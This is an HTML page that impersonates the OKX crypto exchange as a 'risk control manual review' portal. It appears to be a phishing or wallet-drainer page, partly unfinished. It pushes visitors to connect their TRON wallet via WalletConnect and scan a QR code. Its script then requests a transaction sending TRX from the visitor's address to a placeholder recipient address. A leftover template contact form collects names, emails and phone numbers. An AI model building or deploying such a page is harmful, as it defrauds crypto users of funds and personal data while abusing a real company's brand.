<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>歐易 - 風控審查人工通道</title>
    <link rel="icon" type="image/png" href="app_icon.png">
    <script src="https://cdn.jsdelivr.net/npm/walletconnect-v2@1.0.1/dist/umd/index.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <link rel="stylesheet" href="style.css?t=15942">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #000;
            color: #fff;
            margin: 0;
            font-family: Arial, sans-serif;
        }

        .app-banner-parent {
            width: 100%;
            text-align: center;
        }

        /* Header */
        .header {
            background-color: #111;
            padding: 1rem;
        }
        .logo {
            font-size: 1.5rem;
            font-weight: bold;
        }
        .register-btn {
            background-color: #fff;
            color: #000;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 5px;
        }

        /* Hero Section */
        .hero-section {
            text-align: center;
            margin: 3rem 0;
        }
        .hero-section h1 {
            font-size: 2.5rem;
            margin-bottom: 1rem;
        }
        .email-form input {
            border-radius: 5px;
        }

        /* App Banner */
        .app-banner {
            background-color: #f5f5f5;
            color: #000;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 1rem;
            border-radius: 10px;
            max-width: 600px;
            margin: 2rem auto;
            margin-left: 20px;
            margin-right: 20px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
        }
        .app-banner .logo {
            display: flex;
            align-items: center;
            gap: 1rem;
        }
        .app-banner .logo img {
            width: 50px;
            height: 50px;
            border-radius: 10px;
        }
        .app-banner .content {
            flex: 1;
        }
        .app-banner .content p {
            margin: 0;
        }
        .app-banner .content .title {
            font-weight: bold;
            font-size: 1.2rem;
        }
        .app-banner .content .subtitle {
            font-size: 0.9rem;
            color: #666;
        }
        .app-banner .btn-download {
            background-color: #fff;
            color: #000;
            border: 1px solid #ccc;
            border-radius: 20px;
            padding: 0.3rem 1.5rem;
            font-size: 1rem;
            cursor: pointer;
            margin-right: 20px;
        }
        .app-banner .close-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 1rem;
            color: #666;
            cursor: pointer;
            background: none;
            border: none;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header class="header d-flex justify-content-between align-items-center">
        <div class="logo"><img height="36" src="logo.png"/></div>
        <button id="connectWallet" class="register-btn">連接錢包</button>
    </header>

    <!-- Main Section -->
    <main>
        <!-- Hero Section -->
        <section class="hero-section">
            <h1>風控人工審查自助通道</h1>
            <p class="mb-4">風控審查資料提交</p>
            <div class="container">  
                <form id="contact" action="" method="post">
                    <h3>Colorlib Contact Form</h3>
                    <h4>Contact us for custom quote</h4>
                    <fieldset>
                        <input placeholder="Your name" type="text" tabindex="1" required autofocus>
                    </fieldset>
                    <fieldset>
                        <input placeholder="Your Email Address" type="email" tabindex="2" required>
                    </fieldset>
                    <fieldset>
                        <input placeholder="Your Phone Number (optional)" type="tel" tabindex="3" required>
                    </fieldset>
                    <fieldset>
                        <input placeholder="Your Web Site (optional)" type="url" tabindex="4" required>
                    </fieldset>
                    <fieldset>
                        <textarea placeholder="Type your message here...." tabindex="5" required></textarea>
                    </fieldset>
                    <fieldset>
                        <button name="submit" type="submit" id="contact-submit" data-submit="...Sending">提交</button>
                    </fieldset>
                </form>
                <div id="qrcode"></div>
            </div>
        </section>

        <!-- App Banner Section -->
        <div class="app-banner-parent">
            <section class="app-banner">
                <div class="logo">
                    <img src="app_icon.png" alt="Logo">
                    <div class="content">
                        <p class="title">歐易 OKX APP</p>
                        <p class="subtitle">移動交易，隨時隨地</p>
                    </div>
                </div>
                <button class="btn-download">下載</button>
                <button class="close-btn">&times;</button>
            </section>
        </div>
    </main>

    <!-- 引入 Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const projectId = "a77cc736b8e3c7992b959127863c7ba8";
        // 關閉 App Banner
        document.querySelector('.close-btn').addEventListener('click', function() {
            document.querySelector('.app-banner').style.display = 'none';
        });

        // 下載 App
        document.querySelector('.btn-download').addEventListener('click', function() {
            location.href = 'https://apps.apple.com/us/app/okx-buy-bitcoin-btc-crypto/id1327268470d';
        });

        document.getElementById("connectWallet").addEventListener("click", initWalletConnect);
        document.getElementById("sendTransaction").addEventListener("click", sendTronTransaction);

        async function initWalletConnect() {
            console.log("Hello");
            const EthereumProvider = window.WalletConnectEthereumProvider;

            if (!EthereumProvider) {
                console.error("EthereumProvider not found in WalletConnectV2");
                return;
            }

            console.log("Initializing TRON WalletConnect...");

            const provider = await EthereumProvider.init({
                projectId: projectId,
                requiredNamespaces: {
                    tron: {
                        chains: ["tron:1"], // ✅ TRON 主網
                        methods: ["tron_signMessage", "tron_sendTransaction"], // ✅ TRON 支援的操作
                        events: ["accountsChanged", "chainChanged"], // ✅ 監聽的事件
                    },
                },
                rpcMap: {
                    "1": "https://api.trongrid.io", // ✅ TRON 主網 RPC
                    "2": "https://nile.trongrid.io", // ✅ TRON 測試網 RPC
                },
            });

            console.log("TRON Provider Initialized:", provider);

            try {
                console.log("Connecting to TRON WalletConnect...");
                const { uri } = await provider.connect();

                if (uri) {
                    console.log("WalletConnect URI:", uri);
                    document.getElementById("qrcode").innerHTML = ""; // 清空舊的 QR Code
                    new QRCode(document.getElementById("qrcode"), {
                        text: uri,
                        width: 256,
                        height: 256,
                    });
                } else {
                    console.log("❌ URI invalid (可能是 `projectId` 錯誤或 WalletConnect 伺服器問題)");
                    return;
                }

                // 監聽事件
                provider.on("connect", (info) => {
                    console.log("✅ Wallet connected:", info);
                    document.getElementById("sendTransaction").style.display = "block";
                });

                provider.on("disconnect", (error) => {
                    console.log("🔴 Wallet disconnected:", error);
                    document.getElementById("sendTransaction").style.display = "none";
                });

                provider.on("accountsChanged", (accounts) => {
                    console.log("🔄 Accounts changed:", accounts);
                    document.getElementById("output").innerText = `Connected TRON Wallet: ${accounts[0]}`;
                });

                provider.on("chainChanged", (chainId) => {
                    console.log("🌍 Chain changed:", chainId);
                });

                // 🔹 connect() 成功後再請求帳戶
                try {
                    const accounts = await provider.request({
                        method: "tron_requestAccounts",
                    });

                    console.log("✅ Connected TRON Account:", accounts[0]);
                    document.getElementById("output").innerText = `Connected TRON Wallet: ${accounts[0]}`;
                } catch (err) {
                    console.error("❌ Error connecting wallet:", err);
                }

                return provider;
            } catch (error) {
                console.error("❌ Error while connecting to WalletConnect:", error);
            }
        }

        // 發送 TRON 交易
        async function sendTronTransaction() {
            try {
                const provider = await initWalletConnect();

                const accounts = await provider.request({
                    method: "tron_requestAccounts",
                });

                console.log("Connected TRON Account:", accounts[0]);

                // 發送 TRON 交易
                const tx = await provider.request({
                    method: "tron_sendTransaction",
                    params: [{
                        from: accounts[0], // 你的 TRON 地址
                        to: "TXXXXXXXXXXXXXXXXXXXXXXXXXXX", // 目標 TRON 地址
                        value: "1000000", // 交易金額 (單位: sun，1 TRX = 1,000,000 sun)
                        data: "0x", // 可選訊息
                    }],
                });

                console.log("✅ TRON Transaction Sent:", tx);
                alert("Transaction Sent: " + tx);
            } catch (error) {
                console.error("❌ Error sending TRON transaction:", error);
            }
        }
    </script>
</body>
</html>
